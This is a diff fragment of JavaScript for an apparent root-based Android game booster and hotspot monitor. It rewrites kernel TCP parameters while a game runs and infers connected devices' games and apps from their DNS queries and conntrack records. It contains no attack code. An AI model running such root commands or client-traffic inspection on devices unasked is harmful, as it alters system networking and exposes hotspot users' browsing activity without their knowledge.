+        'focus':'窗口焦点', 'topActivity':'栈顶应用', 'fgActivity':'前台应用'
+    }
+    const getDetectSourceLabel = (src) => DETECT_SOURCE_MAP[src] || src || ''
+    let GAME_LAST_SEEN_TIME = 0
+    let PREV_RETRANS = 0
+    let PREV_TOTAL = 0
+    let PACKET_LOSS_BEFORE = 0
+    let PACKET_REPAIR_RATE = 0
+    let LATENCY_BEFORE = 0
+    let LATENCY_AFTER = 0
+    let LATENCY_IMPROVE = 0
+    let LATENCY_LAST_UPDATE = 0
+    let _latencyHistory = []  // 延迟历史，取最近几次均值更稳定
+    let GAME_BOOST_ENABLED = false
+
+    const detectGameTraffic = async () => {
+        try {
+            var isTablet = await isTabletDevice()
+
+            // ===== 手段1（最准）：窗口焦点 mCurrentFocus / mFocusedWindow =====
+            var focusRes = await runShellWithRoot('dumpsys window windows 2>/dev/null | grep -iE "mCurrentFocus|mFocusedWindow" | head -2')
+            var focusText = (focusRes && focusRes.content || '').trim()
+            if (focusText) {
+                var fLines = focusText.split('\n')
+                for (var fi = 0; fi < fLines.length; fi++) {
+                    var fm = fLines[fi].match(/([a-zA-Z][\w]*(?:\.[\w]+)+)\//)
+                    if (fm) {
+                        var fpkg = fm[1]
+                        // 焦点是桌面/社交应用/系统UI → 明确不在游戏，直接返回
+                        if (!isRealGame(fpkg)) return null
+                        var fgName = guessGameByPkg(fpkg)
+                        if (fgName) return { pkg: fpkg, name: fgName, source: 'focus', isGame: true }
+                        // 焦点在但认不出是哪个游戏 → 不猜，落到手段2兜底
+                    }
+                }
+            }
+
+            // ===== 手段2（仅手机）：栈顶 topResumedActivity =====
+            // 平板的活动栈常驻后台Activity容易误判 → 平板跳过此手段，只认窗口焦点
+            if (!isTablet) {
+                var topRes = await runShellWithRoot('dumpsys activity activities 2>/dev/null | grep -iE "topResumedActivity|mResumedActivity|topActivity" | head -3')
+                var topText = (topRes && topRes.content || '').trim()
+                if (topText) {
+                    var tLines = topText.split('\n')
+                    for (var ti = 0; ti < tLines.length; ti++) {
+                        var tm = tLines[ti].match(/([a-zA-Z][\w]*(?:\.[\w]+)+)\/(\w+)/)
+                        if (tm) {
+                            var tpkg = tm[1]
+                            if (!isRealGame(tpkg)) continue
+                            var tName = guessGameByPkg(tpkg)
+                            if (tName) return { pkg: tpkg, name: tName, source: 'topActivity', isGame: true }
+                        }
+                    }
+                }
+            }
+        } catch(e) {
+            addDiagLog('检测异常:'+String(e), 'error')
+        }
+        return null
+    }
+
+    // 游戏结束后还原内核网络参数到系统默认（与手动关闭加速器的还原参数一致）
+    const restoreBoostKernelParams = async () => {
+        try {
+            await runShellWithRoot(
+                'echo 0 > /proc/sys/net/ipv4/tcp_low_latency 2>/dev/null;' +
+                'echo 0 > /proc/sys/net/ipv4/tcp_no_metrics_save 2>/dev/null;' +
+                'echo 0 > /proc/sys/net/ipv4/tcp_tw_reuse 2>/dev/null;' +
+                'echo "4096 87380 6291456" > /proc/sys/net/ipv4/tcp_rmem 2>/dev/null;' +
+                'echo "4096 16384 4194304" > /proc/sys/net/ipv4/tcp_wmem 2>/dev/null;' +
+                'echo 212992 > /proc/sys/net/core/rmem_default 2>/dev/null;' +
+                'echo 212992 > /proc/sys/net/core/wmem_default 2>/dev/null;' +
+                'echo 212992 > /proc/sys/net/core/rmem_max 2>/dev/null;' +
+                'echo 212992 > /proc/sys/net/core/wmem_max 2>/dev/null;' +
+                'echo 1 > /proc/sys/net/ipv4/tcp_window_scaling 2>/dev/null;' +
+                'echo 1 > /proc/sys/net/ipv4/tcp_moderate_rcvbuf 2>/dev/null;' +
+                'echo 1 > /proc/sys/net/ipv4/tcp_adv_win_scale 2>/dev/null;' +
+                'echo 0 > /proc/sys/net/ipv4/tcp_fastopen 2>/dev/null;' +
+                'echo 0 > /proc/sys/net/ipv4/tcp_mtu_probing 2>/dev/null;' +
+                'echo 15 > /proc/sys/net/ipv4/tcp_retries2 2>/dev/null;' +
+                'echo 1 > /proc/sys/net/ipv4/tcp_slow_start_after_idle 2>/dev/null;' +
+                'echo 0 > /proc/sys/net/ipv4/tcp_no_ssthresh_metrics_save 2>/dev/null;' +
+                'echo "cubic" > /proc/sys/net/ipv4/tcp_congestion_control 2>/dev/null;' +
+                'echo "fq_codel" > /proc/sys/net/core/default_qdisc 2>/dev/null;' +
+                'echo 1000 > /proc/sys/net/core/netdev_max_backlog 2>/dev/null;' +
+                'echo 300 > /proc/sys/net/core/netdev_budget 2>/dev/null;' +
+                'echo 8000 > /proc/sys/net/core/netdev_budget_usecs 2>/dev/null;' +
+                'echo 4096 > /proc/sys/net/core/somaxconn 2>/dev/null;' +
+                'echo 1024 > /proc/sys/net/ipv4/tcp_max_syn_backlog 2>/dev/null;' +
+                'echo "32768 60999" > /proc/sys/net/ipv4/ip_local_port_range 2>/dev/null;' +
+                'echo 32768 > /proc/sys/net/ipv4/tcp_max_orphans 2>/dev/null;' +
+                'echo 0 > /proc/sys/net/ipv4/tcp_rfc1337 2>/dev/null;' +
+                'echo 0 > /proc/sys/net/ipv4/tcp_ecn 2>/dev/null;' +
+                'echo GAME_AUTO_OFF'
+            )
+            return true
+        } catch(e) { return false }
+    }
+
+    const readTcpStats = async () => {
+        try {
+            var res = await runShellWithRoot('cat /proc/net/snmp 2>/dev/null')
+            var lines = (res.content || '').split('\n')
+            var retrans = 0, totalSegs = 0
+            var tcpLines = lines.filter(function(l) { return l.startsWith('Tcp:') })
+            if (tcpLines.length >= 2) {
+                var dataParts = tcpLines[1].trim().split(/\s+/)
+                if (dataParts.length >= 12) { totalSegs = parseInt(dataParts[3]) || 0; retrans = parseInt(dataParts[6]) || 0 }
+            }
+            return { retrans: retrans, total: totalSegs }
+        } catch(e) { return { retrans: 0, total: 0 } }
+    }
+
+    const calcPacketLossDelta = (currentStats) => {
+        if (!currentStats) return 0
+        var deltaRetrans = currentStats.retrans - PREV_RETRANS
+        var deltaTotal = currentStats.total - PREV_TOTAL
+        PREV_RETRANS = currentStats.retrans
+        PREV_TOTAL = currentStats.total
+        if (deltaTotal <= 0) return 0
+        return (deltaRetrans / deltaTotal * 100)
+    }
+
+    const readLatency = async () => {
+        try {
+            // 去掉-W 1的1秒超时限制，给ping更充足的时间
+            var res = await runShellWithRoot('timeout 3s ping -c 2 -i 0.3 -W 2 223.5.5.5 2>/dev/null | tail -1')
+            var text = res.content || ''
+            var m = text.match(/([\d.]+)\/([\d.]+)\/([\d.]+)/)
+            if (m) {
+                var lat = parseFloat(m[2])
+                // 记录历史，取最近5次均值，让延迟更稳定
+                _latencyHistory.push(lat)
+                if (_latencyHistory.length > 5) _latencyHistory.shift()
+                var sum = 0
+                for (var i = 0; i < _latencyHistory.length; i++) sum += _latencyHistory[i]
+                return sum / _latencyHistory.length
+            }
+            return 0
+        } catch(e) { return 0 }
+    }
+
+    // 【内存优化】DOM元素缓存，避免高频函数重复查询DOM
+    const _domCache = new Map()
+    const getCachedEl = (selector) => {
+        var cached = _domCache.get(selector)
+        if (cached && cached.isConnected) return cached
+        var el = document.querySelector(selector)
+        if (el) _domCache.set(selector, el)
+        return el
+    }
+
+    const updateGameBoostPanel = () => {
+        var panelEl = getCachedEl('#smart_game_boost_panel')
+        if (!panelEl) return
+        var statusEl = getCachedEl('#smart_boost_status')
+        var gameEl = getCachedEl('#smart_current_game')
+        var durationEl = getCachedEl('#smart_boost_duration')
+        var repairEl = getCachedEl('#smart_repair_rate')
+        var latencyEl = getCachedEl('#smart_latency_improve')
+        var pkgEl = getCachedEl('#smart_boost_pkg')
+        if (!GAME_BOOST_ACTIVE) {
+            if (statusEl) { statusEl.textContent = '待机中'; statusEl.style.color = '#888' }
+            if (gameEl) gameEl.textContent = '无'
+            if (durationEl) durationEl.textContent = '0s'
+            if (repairEl) repairEl.textContent = '0%'
+            if (latencyEl) latencyEl.textContent = '0ms'
+            if (pkgEl) pkgEl.textContent = '-'
+            return
+        }
+        if (statusEl) { statusEl.textContent = '加速中'; statusEl.style.color = '#4ade80' }
+        if (gameEl) gameEl.textContent = GAME_BOOST_CURRENT || '检测中...'
+        if (pkgEl) pkgEl.textContent = GAME_BOOST_PKG || '-'
+        if (GAME_BOOST_START_TIME > 0 && durationEl) {
+            var elapsed = Math.floor((Date.now() - GAME_BOOST_START_TIME) / 1000)
+            var h = Math.floor(elapsed / 3600)
+            var m2 = Math.floor((elapsed % 3600) / 60)
+            var s = elapsed % 60
+            durationEl.textContent = h > 0 ? h+'h '+m2+'m '+s+'s' : (m2 > 0 ? m2+'m '+s+'s' : s+'s')
+        }
+        if (repairEl) {
+            repairEl.textContent = PACKET_REPAIR_RATE.toFixed(1)+'%'
+            repairEl.style.color = PACKET_REPAIR_RATE > 80 ? '#4ade80' : (PACKET_REPAIR_RATE > 50 ? '#fbbf24' : '#ef4444')
+        }
+        if (latencyEl) {
+            latencyEl.textContent = LATENCY_BEFORE > 0 ? LATENCY_BEFORE.toFixed(0)+'→'+LATENCY_AFTER.toFixed(0)+'ms' : LATENCY_AFTER.toFixed(0)+'ms'
+            latencyEl.style.color = LATENCY_IMPROVE > 0 ? '#4ade80' : '#fbbf24'
+        }
+        var lossBeforeEl = getCachedEl('#smart_loss_before')
+        if (lossBeforeEl) {
+            lossBeforeEl.textContent = PACKET_LOSS_BEFORE > 0 ? PACKET_LOSS_BEFORE.toFixed(2)+'%' : '0%'
+        }
+    }
+
+    const gameMonitorLoop = async () => {
+        try {
+            var detected = await detectGameTraffic()
+            var now = Date.now()
+            if (detected && detected.isGame) {
+                GAME_LAST_SEEN_TIME = now
+                var gameName = detected.name
+                var gameId = detected.pkg
+                if (!GAME_BOOST_ACTIVE) {
+                    GAME_BOOST_ACTIVE = true
+                    GAME_BOOST_START_TIME = Date.now()
+                    GAME_BOOST_CURRENT = gameName
+                    GAME_BOOST_PKG = gameId
+                    GAME_BOOST_DETECTED_BY = detected.source
+                    // 【网络优化】readTcpStats和readLatency并行执行
+                    var _baseResults = await Promise.all([readTcpStats(), readLatency()])
+                    var baseStats = _baseResults[0]
+                    PREV_RETRANS = baseStats.retrans
+                    PREV_TOTAL = baseStats.total
+                    PACKET_LOSS_BEFORE = 0
+                    PACKET_REPAIR_RATE = 0
+                    LATENCY_BEFORE = _baseResults[1]
+                    await runShellWithRoot(
+                        'echo 1 > /proc/sys/net/ipv4/tcp_low_latency 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_fin_timeout 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_no_metrics_save 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse 2>/dev/null;' +
+                        // 去限速：放大接收缓冲区上限→16M，默认也提升到4M
+                        'echo "4096 425984 16777216" > /proc/sys/net/ipv4/tcp_rmem 2>/dev/null;' +
+                        // 去限速：放大发送缓冲区上限→16M，默认也提升到4M
+                        'echo "4096 425984 16777216" > /proc/sys/net/ipv4/tcp_wmem 2>/dev/null;' +
+                        // 去限速：提升默认收发缓冲区
+                        'echo 425984 > /proc/sys/net/core/rmem_default 2>/dev/null;' +
+                        'echo 425984 > /proc/sys/net/core/wmem_default 2>/dev/null;' +
+                        'echo 16777216 > /proc/sys/net/core/rmem_max 2>/dev/null;' +
+                        'echo 16777216 > /proc/sys/net/core/wmem_max 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_window_scaling 2>/dev/null;' +
+                        // 去限速：自动调优接收缓冲区
+                        'echo 1 > /proc/sys/net/ipv4/tcp_moderate_rcvbuf 2>/dev/null;' +
+                        // 去限速：窗口缩放因子优化
+                        'echo 1 > /proc/sys/net/ipv4/tcp_adv_win_scale 2>/dev/null;' +
+                        'echo 3 > /proc/sys/net/ipv4/tcp_fastopen 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_mtu_probing 2>/dev/null;' +
+                        // 去限速：重试次数拉满15，绝不提前断连
+                        'echo 15 > /proc/sys/net/ipv4/tcp_retries2 2>/dev/null;' +
+                        // 去限速：关闭空闲后慢启动，避免速度回落
+                        'echo 0 > /proc/sys/net/ipv4/tcp_slow_start_after_idle 2>/dev/null;' +
+                        // 去限速：不保存慢启动阈值，每次都全速
+                        'echo 1 > /proc/sys/net/ipv4/tcp_no_ssthresh_metrics_save 2>/dev/null;' +
+                        'echo "bbr" > /proc/sys/net/ipv4/tcp_congestion_control 2>/dev/null;' +
+                        'echo "fq_codel" > /proc/sys/net/core/default_qdisc 2>/dev/null;' +
+                        // 去限速：增大网络设备发送队列，减少丢包
+                        'echo 10000 > /proc/sys/net/core/netdev_max_backlog 2>/dev/null;' +
+                        // 去限速：增大接收socket队列
+                        'echo 8192 > /proc/sys/net/core/netdev_budget 2>/dev/null;' +
+                        // 去限速：增大处理时间，避免丢包
+                        'echo 20000 > /proc/sys/net/core/netdev_budget_usecs 2>/dev/null;' +
+                        // 去限速：增大somaxconn连接队列
+                        'echo 8192 > /proc/sys/net/core/somaxconn 2>/dev/null;' +
+                        // 去限速：增大SYN队列
+                        'echo 8192 > /proc/sys/net/ipv4/tcp_max_syn_backlog 2>/dev/null;' +
+                        // 去限速：扩大本地端口范围
+                        'echo "1024 65535" > /proc/sys/net/ipv4/ip_local_port_range 2>/dev/null;' +
+                        // 去限速：增大孤儿socket数量
+                        'echo 32768 > /proc/sys/net/ipv4/tcp_max_orphans 2>/dev/null;' +
+                        // 去限速：防止time-wait状态被攻击
+                        'echo 1 > /proc/sys/net/ipv4/tcp_rfc1337 2>/dev/null;' +
+                        // 开启ECN，减少拥塞丢包
+                        'echo 1 > /proc/sys/net/ipv4/tcp_ecn 2>/dev/null;' +
+                        'echo GAME_AUTO_ON'
+                    )
+                    addLog('检测到游戏: '+gameName+' ['+getDetectSourceLabel(detected.source)+']，自动开启加速')
+                    addDiagLog('游戏: '+gameName+' (来源:'+getDetectSourceLabel(detected.source)+', 标识:'+gameId+')，自动开启加速', 'game')
+                    addDiagLog('丢包基线: r='+baseStats.retrans+' total='+baseStats.total, 'info')
+                    addDiagLog('延迟基线: '+LATENCY_BEFORE+'ms', 'info')
+                    addDiagLog('内核: bbr+fq_codel', 'success')
+                    createToast('检测到 '+gameName+'，已自动加速！', 'green', 4000)
+                } else if (GAME_BOOST_CURRENT !== gameName) {
+                    GAME_BOOST_CURRENT = gameName
+                    GAME_BOOST_PKG = gameId
+                    GAME_BOOST_DETECTED_BY = detected.source
+                    addLog('游戏切换: '+gameName+' ['+getDetectSourceLabel(detected.source)+']')
+                    addDiagLog('切换: '+gameName+' ['+getDetectSourceLabel(detected.source)+']', 'game')
+                    createToast('切换加速: '+gameName, 'pink', 3000)
+                }
+            } else {
+                if (GAME_BOOST_ACTIVE && (now - GAME_LAST_SEEN_TIME) > 5000) {
+                    var duration = Math.floor((Date.now() - GAME_BOOST_START_TIME) / 1000)
+                    LATENCY_AFTER = await readLatency()
+                    if (LATENCY_BEFORE > 0 && LATENCY_AFTER > 0) {
+                        LATENCY_IMPROVE = LATENCY_BEFORE - LATENCY_AFTER
+                    }
+                    addLog('游戏结束: '+GAME_BOOST_CURRENT+' 时长:'+duration+'s 丢包修复:'+PACKET_REPAIR_RATE.toFixed(1)+'% 延迟改善:'+LATENCY_IMPROVE.toFixed(0)+'ms')
+                    addDiagLog('结束: '+GAME_BOOST_CURRENT+' 加速'+duration+'s 丢包修复率:'+PACKET_REPAIR_RATE.toFixed(1)+'% 延迟:'+LATENCY_BEFORE.toFixed(0)+'→'+LATENCY_AFTER.toFixed(0)+'ms', 'game')
+                    createToast(GAME_BOOST_CURRENT+' 加速结束', '', 3000)
+                    GAME_BOOST_ACTIVE = false
+                    GAME_BOOST_START_TIME = 0
+                    GAME_BOOST_CURRENT = ''
+                    GAME_BOOST_PKG = ''
+                    GAME_BOOST_DETECTED_BY = ''
+                    GAME_LAST_SEEN_TIME = 0
+                    PACKET_REPAIR_RATE = 0
+                    LATENCY_IMPROVE = 0
+                    // 游戏结束：还原内核网络参数到系统默认（自动加速会话专用）
+                    var _restoreOk = await restoreBoostKernelParams()
+                    addDiagLog(_restoreOk ? '游戏结束: 内核网络参数已还原(cubic+默认缓冲区)' : '游戏结束: 内核参数还原失败', _restoreOk ? 'success' : 'warn')
+                }
+            }
+            if (GAME_BOOST_ACTIVE) {
+                // 去掉15秒限速：每次循环都测延迟，控制更精准
+                var _results = await Promise.all([readTcpStats(), readLatency()])
+                var currentStats = _results[0]
+                var currentLoss = calcPacketLossDelta(currentStats)
+                if (PACKET_LOSS_BEFORE === 0 && currentLoss > 0) {
+                    PACKET_LOSS_BEFORE = currentLoss
+                    addDiagLog('丢包基线='+currentLoss.toFixed(3)+'%', 'warn')
+                }
+                if (PACKET_LOSS_BEFORE > 0) {
+                    PACKET_REPAIR_RATE = Math.max(0, Math.min(100, ((PACKET_LOSS_BEFORE - currentLoss) / PACKET_LOSS_BEFORE * 100)))
+                    if (currentLoss > 0 && PACKET_REPAIR_RATE < 50) {
+                        addDiagLog('丢包高: '+currentLoss.toFixed(3)+'% 修复率='+PACKET_REPAIR_RATE.toFixed(1)+'%', 'warn')
+                    }
+                } else if (currentLoss === 0) {
+                    PACKET_REPAIR_RATE = 100
+                } else {
+                    PACKET_REPAIR_RATE = Math.max(0, 100 - currentLoss * 5)
+                }
+                // 每次都更新延迟，实时反馈
+                LATENCY_LAST_UPDATE = Date.now()
+                LATENCY_AFTER = _results[1]
+                if (LATENCY_BEFORE > 0 && LATENCY_AFTER > 0) {
+                    LATENCY_IMPROVE = LATENCY_BEFORE - LATENCY_AFTER
+                    addDiagLog('延迟: '+LATENCY_BEFORE.toFixed(0)+'→'+LATENCY_AFTER.toFixed(0)+'ms ('+(LATENCY_IMPROVE>0?'+':'')+LATENCY_IMPROVE.toFixed(0)+'ms)', 'net')
+                }
+            }
+            updateGameBoostPanel()
+        } catch(e) {
+            addDiagLog('监控异常:'+String(e), 'error')
+        }
+    }
+
+    const scanDevices = async () => {
+        if (_isScanning) return
+        _isScanning = true
+        try {
+            await _doScanDevices()
+        } catch(e) {
+            addDiagLog('扫描异常: ' + String(e), 'error')
+        }
+        _isScanning = false
+    }
+
+    const _doScanDevices = async () => {
+        const listEl = document.querySelector("#smart_scan_list")
+        if (!listEl) return
+        // 显示扫描中状态
+        listEl.innerHTML = '<div style="text-align:center;padding:15px;opacity:.5;font-size:.6rem">⏳ 正在扫描设备...</div>'
+
+        // ===== 先检查热点监控守护进程是否在运行 =====
+        var daemonRunning = await checkHotspotDaemon()
+
+        // ===== 一次性批量获取所有网络数据，减少 shell 调用次数 =====
+        var batchRes = await runShellWithRoot(
+            'echo __ARP__\n' +
+            'timeout 2s cat /proc/net/arp 2>/dev/null | grep -v "00:00:00:00:00:00" | grep -v "IP " || echo ""\n' +
+            'echo __NEIGH__\n' +
+            'timeout 2s ip neigh 2>/dev/null | grep -v "FAILED" | grep -v "^$" || echo ""\n' +
+            'echo __DHCP__\n' +
+            'timeout 2s cat /data/misc/dhcp/dnsmasq.leases 2>/dev/null || echo ""\n' +
+            'echo __DNS__\n' +
+            'timeout 2s cat /data/misc/dhcp/dnsmasq.log 2>/dev/null | tail -300 | grep -i "query" | awk \'{print $NF}\' | sort -u || echo ""\n' +
+            'echo __CONNTRACK__\n' +
+            'timeout 3s cat /proc/net/nf_conntrack 2>/dev/null || echo ""\n' +
+            'echo __END__'
+        )
+        var batchText = (batchRes && batchRes.content) ? batchRes.content : ''
+
+        // 解析各部分
+        var arpText = '', neighText = '', dhcpText = '', dnsText = '', conntrackText = ''
+        if (batchText.indexOf('__ARP__') >= 0) {
+            arpText = batchText.split('__ARP__')[1] || ''
+            arpText = arpText.split('__NEIGH__')[0] || ''
+        }
+        if (batchText.indexOf('__NEIGH__') >= 0) {
+            neighText = batchText.split('__NEIGH__')[1] || ''
+            neighText = neighText.split('__DHCP__')[0] || ''
+        }
+        if (batchText.indexOf('__DHCP__') >= 0) {
+            dhcpText = batchText.split('__DHCP__')[1] || ''
+            dhcpText = dhcpText.split('__DNS__')[0] || ''
+        }
+        if (batchText.indexOf('__DNS__') >= 0) {
+            dnsText = batchText.split('__DNS__')[1] || ''
+            dnsText = dnsText.split('__CONNTRACK__')[0] || ''
+        }
+        if (batchText.indexOf('__CONNTRACK__') >= 0) {
+            conntrackText = batchText.split('__CONNTRACK__')[1] || ''
+            conntrackText = conntrackText.split('__END__')[0] || ''
+        }
+        dnsText = dnsText.toLowerCase()
+        var dnsTextLower = dnsText
+        var conntrackLower = conntrackText.toLowerCase()
+
+        const devices = []
+
+        // ===== 优先从热点流量监控读取设备数据 =====
+        var hotspotData = await readHotspotTrafficData()
+        var hotspotPolicy = await readHotspotPolicy()
+        if (hotspotData && hotspotData.devices) {
+            var htCount = 0
+            for (var macKey in hotspotData.devices) {
+                var dev = hotspotData.devices[macKey]
+                if (!dev || !dev.mac) continue
+                htCount++
+                var displayName = resolveDisplayName(dev)
+                devices.push({
+                    ip: dev.ip || '',
+                    mac: dev.mac,
+                    hostname: displayName,
+                    brand: '',
+                    model: '',
+                    randomMac: false,
+                    online: dev.online !== undefined ? dev.online : true,
+                    connections: 0,
+                    txBytes: dev.txBytes || 0,
+                    rxBytes: dev.rxBytes || 0,
+                    apps: [],
+                    game: '',
+                    connType: dev.connType || '',
+                    customName: displayName,
+                    htDevice: true,
+                    blocked: hotspotPolicy && hotspotPolicy[dev.mac] && hotspotPolicy[dev.mac].type === 'blacklist'
+                })
+            }
+            addDiagLog('从热点流量监控获取 '+htCount+' 台设备 (守护进程:'+(daemonRunning?'运行':'未运行')+')', 'net')
+        }
+
+        // ===== 从 ARP 补充设备 =====
+        if (arpText.trim()) {
+            var arpLines = arpText.trim().split('\n').filter(function(l) { return l.trim() })
+            for (var ai = 0; ai < arpLines.length; ai++) {
+                var parts = arpLines[ai].trim().split(/\s+/)
+                if (parts.length >= 4) {
+                    var ip = parts[0]
+                    var mac = parts[3]
+                    if (mac && mac !== '00:00:00:00:00:00' && mac !== '*') {
+                        var exists = devices.some(function(d) { return d.mac.toUpperCase() === mac.toUpperCase() })
+                        if (!exists) {
+                            var arpName = _hotspotNameMap[mac.toUpperCase()] || ''
+                            devices.push({ ip: ip, mac: mac, hostname: arpName, brand: '', model: '', randomMac: false, online: true, connections: 0, txBytes: 0, rxBytes: 0, apps: [], game: '', htDevice: false, customName: arpName })
+                        } else {
+                            var existing = devices.find(function(d) { return d.mac.toUpperCase() === mac.toUpperCase() })
+                            if (existing && !existing.ip) existing.ip = ip
+                        }
+                    }
+                }
+            }
+        }
+
+        // ===== 从 ip neigh 补充设备（ARP 可能不全） =====
+        if (neighText.trim()) {
+            var neighLines = neighText.trim().split('\n').filter(function(l) { return l.trim() })
+            for (var ni = 0; ni < neighLines.length; ni++) {
+                var nparts = neighLines[ni].trim().split(/\s+/)
+                if (nparts.length >= 4) {
+                    var nip = nparts[0]
+                    var nmac = nparts[4] || nparts[3] || ''
+                    // ip neigh 格式: "192.168.1.100 dev wlan0 lladdr aa:bb:cc:dd:ee:ff REACHABLE"
+                    // 找 lladdr 后面的 MAC
+                    var lineStr = neighLines[ni]
+                    var macMatch = lineStr.match(/([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})/)
+                    if (macMatch) nmac = macMatch[1]
+                    if (nmac && nmac !== '00:00:00:00:00:00' && nmac.indexOf(':') > 0) {
+                        var nexists = devices.some(function(d) { return d.mac.toUpperCase() === nmac.toUpperCase() })
+                        if (!nexists) {
+                            var nName = _hotspotNameMap[nmac.toUpperCase()] || ''
+                            var nState = lineStr.match(/(REACHABLE|STALE|DELAY|PROBE|INCOMPLETE)/)
+                            devices.push({ ip: nip, mac: nmac, hostname: nName, brand: '', model: '', randomMac: false, online: nState && nState[1] !== 'INCOMPLETE', connections: 0, txBytes: 0, rxBytes: 0, apps: [], game: '', htDevice: false, customName: nName })
+                        } else {
+                            var nexisting = devices.find(function(d) { return d.mac.toUpperCase() === nmac.toUpperCase() })
+                            if (nexisting && !nexisting.ip) nexisting.ip = nip
+                        }
+                    }
+                }
+            }
+        }
+
+        // ===== 从 DHCP leases 补充设备名 =====
+        if (dhcpText.trim()) {
+            var dhcpLines = dhcpText.trim().split('\n').filter(function(l) { return l.trim() })
+            for (var di = 0; di < devices.length; di++) {
+                var dd = devices[di]
+                if (!dd.hostname) {
+                    for (var dj = 0; dj < dhcpLines.length; dj++) {
+                        var dparts = dhcpLines[dj].trim().split(/\s+/)
+                        if (dparts.length >= 2 && dparts[1] === dd.mac) {
+                            var dhcpHostname = dparts[3] || dparts[2] || ''
+                            if (dhcpHostname) {
+                                dd.hostname = dhcpHostname
+                                if (!dd.customName) dd.customName = dhcpHostname
+                            }
+                        }
+                    }
+                    if (!dd.hostname) {
+                        var htName = _hotspotNameMap[dd.mac.toUpperCase()]
+                        if (htName) {
+                            dd.hostname = htName
+                            dd.customName = htName
+                        }
+                    }
+                }
+            }
+        }
+
+        // ===== 批量从 conntrack 获取连接数和流量（一次解析所有设备） =====
+        for (var bi = 0; bi < devices.length; bi++) {
+            var bd = devices[bi]
+            bd.brand = getBrandByMac(bd.mac)
+            bd.model = getModelByHostname(bd.hostname)
+            bd.randomMac = isRandomMac(bd.mac)
+
+            if (bd.ip && conntrackText) {
+                // 从已获取的 conntrack 文本中解析，不需要再调 shell
+                var ipLines = conntrackText.split('\n').filter(function(l) { return l.indexOf(bd.ip) >= 0 })
+                bd.connections = ipLines.length
+                // 如果热点监控没有提供流量，从 conntrack 估算
+                if (!bd.htDevice || !bd.txBytes) {
+                    var totalBytes = 0
+                    for (var cli = 0; cli < ipLines.length; cli++) {
+                        var matches = ipLines[cli].match(/bytes=(\d+)/g) || []
+                        for (var mi = 0; mi < matches.length; mi++) {
+                            var bval = matches[mi].match(/bytes=(\d+)/)
+                            if (bval) totalBytes += parseInt(bval[1]) || 0
+                        }
+                    }
+                    bd.txBytes = totalBytes
+                }
+                // 从 conntrack 端口识别应用
+                var ports = new Set()
+                for (var pli = 0; pli < ipLines.length && pli < 30; pli++) {
+                    var dportMatches = ipLines[pli].match(/dport=(\d+)/g) || []
+                    for (var dpi = 0; dpi < dportMatches.length; dpi++) {
+                        var dval = dportMatches[dpi].match(/dport=(\d+)/)
+                        if (dval) ports.add(dval[1])
+                    }
+                }
+                var detectedApps = new Set()
+                ports.forEach(function(p) {
+                    if (p === '443' || p === '80') detectedApps.add('网页浏览')
+                    else if (p === '1935') detectedApps.add('直播流')
+                })
+                var connDetail = ipLines.join('\n').toLowerCase()
+                var gameByDns = guessGameByDns(dnsTextLower + '\n' + connDetail)
+                if (gameByDns) {
+                    detectedApps.add('游戏: ' + gameByDns)
+                    bd.game = gameByDns
+                }
+                var gameByPort = guessGameByPort(Array.from(ports))
+                if (gameByPort) {
+                    detectedApps.add('游戏: ' + gameByPort)
+                    bd.game = gameByPort
+                }
+                if (bd.connections > 50 && !bd.game) detectedApps.add('高流量')
+                if (detectedApps.size === 0 && bd.connections > 0) detectedApps.add('在线活动')
+                if (detectedApps.size === 0) detectedApps.add('空闲')
+                bd.apps = Array.from(new Set(detectedApps))
+            } else {
+                bd.apps = ['空闲']
+            }
+        }
+
+        const countEl = document.querySelector("#smart_device_count")
+        if (countEl) countEl.textContent = devices.length
+        if (devices.length === 0) {
+            listEl.innerHTML = '<div style="text-align:center;padding:20px;opacity:.5;font-size:.6rem">暂无设备连接<br><span style="font-size:.45rem;opacity:.5;">' + (daemonRunning ? '热点监控守护进程运行中，但未检测到设备' : '热点监控守护进程未运行，无法识别设备！请先安装运行热点流量监控插件') + '</span></div>'
+            addDiagLog('扫描完成: 0台设备 (守护进程:'+(daemonRunning?'运行':'未运行')+')', 'net')
+            return
+        }
+        // 排序：在线设备优先，然后按流量降序
+        devices.sort(function(a, b) {
+            if (a.online && !b.online) return -1
+            if (!a.online && b.online) return 1
+            return ((b.txBytes || 0) + (b.rxBytes || 0)) - ((a.txBytes || 0) + (a.rxBytes || 0))
+        })
+        listEl.innerHTML = devices.map((d, i) => {
+            const brandInfo = BRAND_INFO[d.brand] || { bg: 'linear-gradient(135deg,#ff9ecd,#ffd1e3)', text: (d.brand || '?').substring(0,2), label: d.brand }
+            const modelText = d.model ? d.model : (d.brand && d.brand !== '网络设备' ? brandInfo.label : '')
+            const onlineDot = '<span style="display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:4px;vertical-align:middle;background:'+(d.online ? '#4CAF50' : '#666')+'"></span>'
+            const brandLogo = '<div style="width:36px;height:36px;border-radius:50%;background:'+brandInfo.bg+';display:flex;align-items:center;justify-content:center;font-size:.6rem;font-weight:bold;color:white;flex-shrink:0;">'+(brandInfo.text || (d.brand || '?').substring(0,2))+'</div>'
+            const randomTag = d.randomMac ? '<span style="background:rgba(255,193,7,.2);color:#ffc107;padding:1px 5px;border-radius:8px;font-size:.4rem;margin-left:4px;">随机MAC</span>' : ''
+            const gameTag = d.game ? '<span style="background:linear-gradient(135deg,#4ade80,#22c55e);color:white;padding:2px 6px;border-radius:10px;font-size:.45rem;margin-left:4px;">🎮 '+d.game+'</span>' : ''
+            const htTag = d.htDevice ? '<span style="background:rgba(96,165,250,.15);color:#60a5fa;padding:1px 5px;border-radius:8px;font-size:.4rem;margin-left:4px;">热点监控</span>' : ''
+            const blockedTag = d.blocked ? '<span style="background:rgba(239,68,68,.2);color:#ef4444;padding:1px 5px;border-radius:8px;font-size:.4rem;margin-left:4px;">已拉黑</span>' : ''
+            const appBadges = d.apps.map(function(a) {
+                var color = a.includes('游戏') ? '#4ade80' : a.includes('视频') || a.includes('直播') ? '#fbbf24' : '#a78bfa'
